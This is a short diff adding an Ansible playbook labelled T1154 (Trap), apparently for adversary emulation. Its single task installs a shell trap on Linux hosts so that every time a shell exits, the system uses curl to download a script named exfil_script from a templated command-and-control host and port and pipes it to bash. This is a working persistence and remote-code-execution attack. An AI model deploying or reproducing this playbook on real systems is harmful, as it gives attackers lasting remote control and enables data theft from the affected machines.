@@ -1,0 +1,11 @@
+# Playbook-T1154
+# download and execute shell script everytime users exist
+- name : Trap
+  hosts: linux
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+    - name:
+      shell: |
+        trap 'nohup curl -sS http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ exfil_script}} | bash' EXIT
+      
